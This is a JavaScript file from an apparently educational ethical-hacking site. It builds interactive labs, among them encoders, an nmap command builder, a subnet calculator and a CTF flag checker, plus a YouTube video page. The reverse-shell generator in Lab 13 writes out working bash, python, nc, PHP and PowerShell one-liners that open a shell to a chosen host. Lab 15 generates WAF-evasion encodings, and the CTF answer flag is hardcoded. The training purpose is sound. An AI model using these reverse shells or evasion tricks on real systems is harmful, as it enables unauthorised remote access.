    document.getElementById('res-rot13').textContent = text.replace(/[a-zA-Z]/g, c => {
      const base = c <= 'Z' ? 65 : 97;
      return String.fromCharCode(((c.charCodeAt(0) - base + 13) % 26) + base);
    }) || 'Empty';

    try {
      const msgBuffer = new TextEncoder().encode(text);
      const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
      const hashArray = Array.from(new Uint8Array(hashBuffer));
      document.getElementById('res-sha256').textContent = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
    } catch {
      document.getElementById('res-sha256').textContent = 'N/A';
    }
  }

  input.addEventListener('input', updateEncodings);
  updateEncodings();
}

// LAB 10: Nmap
function initNmapBuilder() {
  const targetInp = document.getElementById('nmap-target');
  const cmdOutput = document.getElementById('nmap-generated-cmd');
  const copyBtn = document.getElementById('btn-copy-nmap');
  if (!targetInp || !cmdOutput) return;

  function update() {
    const t = targetInp.value.trim() || '10.10.10.254';
    const f = [];
    if (document.getElementById('nmap-sS')?.checked) f.push('-sS');
    if (document.getElementById('nmap-sV')?.checked) f.push('-sV');
    if (document.getElementById('nmap-sC')?.checked) f.push('-sC');
    if (document.getElementById('nmap-A')?.checked) f.push('-A');
    if (document.getElementById('nmap-p')?.checked) f.push('-p-');
    if (document.getElementById('nmap-Pn')?.checked) f.push('-Pn');
    if (document.getElementById('nmap-vuln')?.checked) f.push('--script=vuln');
    if (document.getElementById('nmap-T4')?.checked) f.push('-T4');
    cmdOutput.textContent = `nmap ${f.join(' ')} ${t}`;
  }

  targetInp.addEventListener('input', update);
  document.querySelectorAll('.nmap-check input').forEach(c => c.addEventListener('change', update));
  if (copyBtn) copyBtn.addEventListener('click', () => { navigator.clipboard.writeText(cmdOutput.textContent); showToast('Nmap command copied!'); });
}

// LAB 11: Subnet
function initSubnetCalculator() {
  const input = document.getElementById('cidr-input');
  if (!input) return;

  function calc() {
    const val = input.value.trim();
    const match = val.match(/^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\/(\d{1,2})$/);
    if (!match) return;
    const ip = match[1];
    const prefix = parseInt(match[2], 10);
    if (prefix < 8 || prefix > 30) return;

    const total = Math.pow(2, 32 - prefix);
    const usable = total > 2 ? total - 2 : total;
    const parts = ip.split('.').map(Number);
    const ipNum = ((parts[0] << 24) >>> 0) + ((parts[1] << 16) >>> 0) + ((parts[2] << 8) >>> 0) + (parts[3] >>> 0);
    const maskNum = (0xFFFFFFFF << (32 - prefix)) >>> 0;
    const netNum = (ipNum & maskNum) >>> 0;
    const bcastNum = (netNum | (~maskNum >>> 0)) >>> 0;
    const numToIp = n => [(n >>> 24) & 255, (n >>> 16) & 255, (n >>> 8) & 255, n & 255].join('.');

    document.getElementById('sub-net').textContent = numToIp(netNum);
    document.getElementById('sub-range').textContent = `${numToIp(netNum + 1)} — ${numToIp(bcastNum - 1)}`;
    document.getElementById('sub-bcast').textContent = numToIp(bcastNum);
    document.getElementById('sub-hosts').textContent = `${usable} Usable (${total} Total)`;
  }

  input.addEventListener('input', calc);
  calc();
}

// LAB 12: Headers
function initHeadersAuditor() {
  const btn = document.getElementById('btn-audit-headers');
  const input = document.getElementById('headers-input');
  const out = document.getElementById('headers-output');
  if (!btn || !input || !out) return;

  btn.addEventListener('click', () => {
    const text = input.value;
    const hasCSP = /Content-Security-Policy/i.test(text);
    const hasHSTS = /Strict-Transport-Security/i.test(text);
    const hasXFO = /X-Frame-Options/i.test(text);
    const hasXCTO = /X-Content-Type-Options/i.test(text);

    let score = (hasCSP ? 25 : 0) + (hasHSTS ? 25 : 0) + (hasXFO ? 25 : 0) + (hasXCTO ? 25 : 0);
    out.innerHTML = `
      <div class="terminal-line"><span class="cmd-info">[+] Security Hardening Score: ${score}/100</span></div>
      <div class="terminal-line">${hasHSTS ? '<span class="cmd-success">[✓] HSTS Header: Present</span>' : '<span class="cmd-warn">[!] HSTS: Missing (Risk: MITM Downgrade)</span>'}</div>
      <div class="terminal-line">${hasCSP ? '<span class="cmd-success">[✓] CSP Header: Present</span>' : '<span class="cmd-warn">[!] CSP: Missing (Risk: XSS / Data Exfiltration)</span>'}</div>
      <div class="terminal-line">${hasXFO ? '<span class="cmd-success">[✓] X-Frame-Options: Present</span>' : '<span class="cmd-warn">[!] X-Frame-Options: Missing (Risk: Clickjacking)</span>'}</div>
      <div class="terminal-line">${hasXCTO ? '<span class="cmd-success">[✓] X-Content-Type-Options: Present</span>' : '<span class="cmd-warn">[!] X-Content-Type-Options: Missing (Risk: MIME Sniffing)</span>'}</div>
    `;
  });
}

// LAB 13: RevShell
function initRevShellGenerator() {
  const ip = document.getElementById('rev-ip');
  const port = document.getElementById('rev-port');
  const lang = document.getElementById('rev-lang');
  const out = document.getElementById('rev-output');
  const copyBtn = document.getElementById('btn-copy-rev');
  if (!ip || !port || !out) return;

  function update() {
    const i = ip.value.trim() || '10.10.14.5';
    const p = port.value.trim() || '4444';
    const l = lang.value;
    let s = '';
    if (l === 'bash') s = `bash -i >& /dev/tcp/${i}/${p} 0>&1`;
    if (l === 'python') s = `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${i}",${p}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'`;
    if (l === 'nc') s = `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${i} ${p} >/tmp/f`;
    if (l === 'php') s = `php -r '$sock=fsockopen("${i}",${p});exec("/bin/sh -i <&3 >&3 2>&3");'`;
    if (l === 'powershell') s = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${i}",${p})`;
    out.textContent = s;
  }

  ip.addEventListener('input', update);
  port.addEventListener('input', update);
  lang.addEventListener('change', update);
  if (copyBtn) copyBtn.addEventListener('click', () => { navigator.clipboard.writeText(out.textContent); showToast('Reverse shell copied!'); });
}

// LAB 14: Chmod
function initChmodCalculator() {
  const suid = document.getElementById('chk-suid');
  const ur = document.getElementById('chk-u-r');
  const uw = document.getElementById('chk-u-w');
  const ux = document.getElementById('chk-u-x');
  const gr = document.getElementById('chk-g-r');
  const gx = document.getElementById('chk-g-x');
  const or = document.getElementById('chk-o-r');
  const ox = document.getElementById('chk-o-x');
  if (!suid || !ur) return;

  function update() {
    let special = suid.checked ? 4 : 0;
    let u = (ur.checked ? 4 : 0) + (uw.checked ? 2 : 0) + (ux.checked ? 1 : 0);
    let g = (gr.checked ? 4 : 0) + (gx.checked ? 1 : 0);
    let o = (or.checked ? 4 : 0) + (ox.checked ? 1 : 0);
    const octal = `${special}${u}${g}${o}`;
    const sym = `-${ur.checked?'r':'-'}${uw.checked?'w':'-'}${suid.checked?'s':(ux.checked?'x':'-')}${gr.checked?'r':'-'}-${gx.checked?'x':'-'}${or.checked?'r':'-'}-${ox.checked?'x':'-'}`;

    document.getElementById('perm-octal').textContent = octal;
    document.getElementById('perm-symbolic').textContent = sym;
    document.getElementById('perm-risk').textContent = suid.checked ? 'High Risk SUID Active (GTFOBins Attack Vector)' : 'Standard User Permissions';
  }

  document.querySelectorAll('.nmap-options-grid input').forEach(c => c.addEventListener('change', update));
  update();
}

// LAB 15: WAF Obfuscator
function initWAFObfuscator() {
  const inp = document.getElementById('waf-input');
  if (!inp) return;

  function update() {
    const v = inp.value;
    document.getElementById('waf-comments').textContent = v.replace(/\s+/g, '/**/');
    document.getElementById('waf-case').textContent = v.split('').map((c, i) => i % 2 === 0 ? c.toUpperCase() : c.toLowerCase()).join('');
    document.getElementById('waf-double-url').textContent = encodeURIComponent(encodeURIComponent(v));
    let hex = '0x';
    for (let i = 0; i < v.length; i++) hex += v.charCodeAt(i).toString(16);
    document.getElementById('waf-hex').textContent = hex;
  }

  inp.addEventListener('input', update);
  update();
}

// LAB 16: ROT Solver
function initRotSolver() {
  const input = document.getElementById('rot-input');
  const out = document.getElementById('rot-output');
  if (!input || !out) return;

  function solve() {
    const text = input.value;
    let html = '';
    for (let shift = 1; shift <= 25; shift++) {
      const shifted = text.replace(/[a-zA-Z]/g, c => {
        const base = c <= 'Z' ? 65 : 97;
        return String.fromCharCode(((c.charCodeAt(0) - base + shift) % 26) + base);
      });
      const isCandidate = /ethical|explorer|security|cyber|flag|hacker/i.test(shifted);
      html += `<div class="terminal-line" style="${isCandidate ? 'color:var(--neon-green);font-weight:bold;' : 'color:var(--text-muted);'}">[ROT-${shift.toString().padStart(2, '0')}] ${escapeHtml(shifted)} ${isCandidate ? ' ★ [MATCH FOUND]' : ''}</div>`;
    }
    out.innerHTML = html;
  }

  input.addEventListener('input', solve);
  solve();
}

// LAB 17: Magic Bytes
function initMagicBytesLab() {
  const inp = document.getElementById('magic-input');
  if (!inp) return;

  function check() {
    const v = inp.value.trim();
    if (v.startsWith('TVq')) {
      document.getElementById('magic-format').textContent = 'Windows Portable Executable (.EXE / .DLL)';
      document.getElementById('magic-hex').textContent = '4D 5A (MZ Header)';
      document.getElementById('magic-risk').textContent = 'High Risk Executable';
    } else if (v.startsWith('f0VMRg') || v.startsWith('7f454c46')) {
      document.getElementById('magic-format').textContent = 'Linux Executable and Linkable Format (ELF)';
      document.getElementById('magic-hex').textContent = '7F 45 4C 46 (.ELF)';
      document.getElementById('magic-risk').textContent = 'High Risk Linux Binary';
    } else if (v.startsWith('UEs')) {
      document.getElementById('magic-format').textContent = 'ZIP Archive / Office DOCX';
      document.getElementById('magic-hex').textContent = '50 4B 03 04 (PK..)';
      document.getElementById('magic-risk').textContent = 'Compressed Archive';
    } else {
      document.getElementById('magic-format').textContent = 'PNG Image File';
      document.getElementById('magic-hex').textContent = '89 50 4E 47 (.PNG)';
      document.getElementById('magic-risk').textContent = 'Low Risk Media';
    }
  }

  inp.addEventListener('input', check);
  check();
}

// LAB 18: Hash Identifier
function initHashIdentifier() {
  const inp = document.getElementById('hash-id-input');
  if (!inp) return;

  function analyze() {
    const h = inp.value.trim();
    const len = h.length;
    document.getElementById('hash-len').textContent = `${len} characters (${len * 4} bits)`;

    let candidate = 'Unknown';
    if (len === 32) candidate = 'MD5 / NTLM';
    else if (len === 40) candidate = 'SHA-1 / RIPEMD-160';
    else if (len === 64) candidate = 'SHA-256 / SHA3-256';
    else if (len === 128) candidate = 'SHA-512 / Whirlpool';
    else if (h.startsWith('$2a$') || h.startsWith('$2b$')) candidate = 'bcrypt Password Hash';
    document.getElementById('hash-candidate').textContent = candidate;

    // Shannon Entropy
    const map = {};
    for (let c of h) map[c] = (map[c] || 0) + 1;
    let entropy = 0;
    for (let c in map) {
      let p = map[c] / len;
      entropy -= p * Math.log2(p);
    }
    document.getElementById('hash-entropy').textContent = `${entropy.toFixed(2)} / 4.00 (Randomness)`;
  }

  inp.addEventListener('input', analyze);
  analyze();
}

// LAB 19: DNS Simulator
function initDNSSimulator() {
  const btn = document.getElementById('btn-run-dns');
  const target = document.getElementById('dns-target');
  const out = document.getElementById('dns-output');
  if (!btn || !target || !out) return;

  btn.addEventListener('click', () => {
    const d = target.value.trim();
    out.innerHTML = `
      <div class="terminal-line"><span class="cmd-info">; <<>> DiG 9.18.1-1ubuntu1 <<>> ${d} ANY +noall +answer</span></div>
      <div class="terminal-line" style="color:var(--neon-cyan);">${d}.  300  IN  A    185.199.108.153</div>
      <div class="terminal-line" style="color:var(--neon-cyan);">${d}.  300  IN  A    185.199.109.153</div>
      <div class="terminal-line" style="color:var(--neon-green);">${d}.  3600 IN  MX   10 mail.${d}.</div>
      <div class="terminal-line" style="color:var(--neon-yellow);">${d}.  3600 IN  TXT  "v=spf1 include:_spf.google.com ~all"</div>
      <div class="terminal-line"><span class="cmd-success">[✓] Query time: 14 msec | SERVER: 1.1.1.1#53(1.1.1.1)</span></div>
    `;
  });
}

// LAB 20: CTF Challenge Room
function initCTFChallengeRoom() {
  const inp = document.getElementById('ctf-flag-input');
  const btn = document.getElementById('btn-submit-flag');
  const out = document.getElementById('ctf-output');
  if (!btn || !inp || !out) return;

  btn.addEventListener('click', () => {
    const val = inp.value.trim();
    // Clue was: Base64 'EE{SUPER_CYBER_HACKER_2026}'
    if (val === 'EE{SUPER_CYBER_HACKER_2026}') {
      awardLabPoints('ctf', 'Multi-Stage CTF Flag Master');
      out.innerHTML = `
        <div class="terminal-line"><span class="cmd-success">══════════════════════════════════════════════════════</span></div>
        <div class="terminal-line" style="color:var(--neon-green);font-size:1rem;font-weight:bold;">🏆 CONGRATULATIONS, EXPLORER! FLAG VERIFIED 100% CORRECT!</div>
        <div class="terminal-line" style="color:var(--neon-purple-bright);">[★] MASTER EXPLORER BADGE UNLOCKED: EE_CHALLENGE_MASTER_2026</div>
        <div class="terminal-line"><span class="cmd-success">══════════════════════════════════════════════════════</span></div>
      `;
      showToast('🏆 FLAG ACCEPTED! Master Badge Unlocked!');
    } else {
      out.innerHTML = `<div class="terminal-line"><span class="cmd-warn">[!] Incorrect Flag! Clue: Base64-decode the string in the clue box above.</span></div>`;
    }
  });
}

function escapeHtml(text) {
  return text.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#039;');
}

// ================================================================
// VIDEOS PAGE
// ================================================================
// ================================================================
// VIDEOS PAGE
// ================================================================
async function renderVideosPage() {
  const content = document.getElementById('app-content');
  document.title = `Video Tutorials | ${SITE_NAME}`;

  content.innerHTML = `
    <div class="container section-padding page-transition">
      <div class="section-header reveal">
        <h1 class="glitch-text" data-text="CYBER VIDEO HUB" style="font-size: clamp(1.5rem, 4vw, 2.5rem);">CYBER VIDEO HUB</h1>
        <p class="section-subtitle">> Official YouTube video tutorials from @ethicalexplorers18</p>
      </div>

      <div style="display: flex; justify-content: center; align-items: center; gap: 1rem; margin-bottom: 2rem; flex-wrap: wrap;" class="reveal">
        <a href="${SOCIAL_LINKS.youtube}" target="_blank" rel="noopener noreferrer" class="btn btn-primary" style="display: inline-flex; align-items: center; gap: 8px;">
          ${ICONS.youtube} Subscribe on YouTube (@ethicalexplorers18)
        </a>
      </div>

      <div class="sandbox-filter-nav reveal" id="videos-category-filters">
        <button class="sandbox-category-btn active" data-vcat="all">All Videos</button>
        <button class="sandbox-category-btn" data-vcat="OSINT & Recon">OSINT & Recon</button>
        <button class="sandbox-category-btn" data-vcat="Linux & System">Linux & Tools</button>
        <button class="sandbox-category-btn" data-vcat="Web & Vulnerability Scanning">Web & Scanners</button>
        <button class="sandbox-category-btn" data-vcat="Network & Wireless Attacks">Wireless & Network</button>
      </div>

      <div id="videos-grid" class="video-grid reveal" style="margin-top: 1.5rem;">
        <div class="loading-container">
          <div class="loading-spinner"></div>
          <div class="loading-text">Synchronizing latest channel videos...</div>
        </div>
      </div>
    </div>
  `;

  const videos = await fetchVideos();
  const grid = document.getElementById('videos-grid');
  if (!grid) return;

  // Normalize video structure
  const allVideos = videos.map(v => ({
    id: v.id || v.youtubeId,
    title: v.title,
    category: v.category || 'Ethical Hacking',
    date: v.date || '',
    description: v.description || '',
    youtubeUrl: v.youtubeUrl || `https://www.youtube.com/watch?v=${v.id || v.youtubeId}`
  })).filter(v => v.id);

  if (allVideos.length === 0) {
    grid.innerHTML = `
      <div class="empty-state" style="grid-column: 1/-1;">
        <h3>No videos loaded yet</h3>
        <p>Visit our <a href="${SOCIAL_LINKS.youtube}" target="_blank" rel="noopener noreferrer">YouTube Channel (@ethicalexplorers18)</a> for daily uploads.</p>
      </div>
    `;
    return;
  }

  function renderVideoItems(filterCat = 'all') {
    const filtered = filterCat === 'all' 
      ? allVideos 
      : allVideos.filter(v => (v.category || '').toLowerCase().includes(filterCat.toLowerCase()));

    if (filtered.length === 0) {
      grid.innerHTML = `
        <div class="empty-state" style="grid-column: 1/-1;">
          <h3>No videos in this category</h3>
          <p>Check "All Videos" to explore all channel tutorials.</p>
        </div>
      `;
      return;
    }

    // Check if video is recent (within 7 days)
    const sevenDaysAgo = new Date(Date.now() - 7 * 24 * 60 * 60 * 1000).toISOString().substring(0, 10);

    grid.innerHTML = filtered.map(v => {
      const isNew = v.date && v.date >= sevenDaysAgo;
      // YouTube facade pattern: show thumbnail first, load iframe on click
      return `
      <div class="video-card">
        <div class="video-facade" data-video-id="${v.id}" role="button" tabindex="0" aria-label="Play ${v.title.replace(/"/g, '&quot;')}">
          <img src="https://img.youtube.com/vi/${v.id}/hqdefault.jpg" 
               alt="${v.title.replace(/"/g, '&quot;')}" 
               loading="lazy" decoding="async"
               style="width:100%;height:100%;object-fit:cover;border-radius:12px 12px 0 0;">
          <div class="video-play-btn">▶</div>
          ${isNew ? '<span class="video-new-badge">NEW</span>' : ''}
        </div>
        <div class="video-card-info">
          <h3>${v.title}</h3>
          <div style="display:flex; justify-content:space-between; align-items:center; margin-top:0.5rem;">
            ${v.category ? `<span class="video-category">${v.category}</span>` : '<span></span>'}
            ${v.date ? `<span style="font-family:var(--font-mono); font-size:0.75rem; color:var(--text-muted);">${v.date}</span>` : ''}
          </div>
        </div>
      </div>
    `;
    }).join('');

    // Attach click handlers to facade thumbnails
    grid.querySelectorAll('.video-facade').forEach(facade => {
      const handler = () => {
        const vid = facade.dataset.videoId;
        facade.outerHTML = `<div class="video-embed"><iframe src="https://www.youtube.com/embed/${vid}?autoplay=1" title="YouTube Video" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe></div>`;
      };
      facade.addEventListener('click', handler);
      facade.addEventListener('keypress', (e) => { if (e.key === 'Enter') handler(); });
    });
  }

  renderVideoItems('all');

  // Attach category filter events
  const filterBtns = document.querySelectorAll('#videos-category-filters .sandbox-category-btn');
  filterBtns.forEach(btn => {
    btn.addEventListener('click', () => {
      filterBtns.forEach(b => b.classList.remove('active'));
      btn.classList.add('active');
      renderVideoItems(btn.dataset.vcat);
    });
  });
}
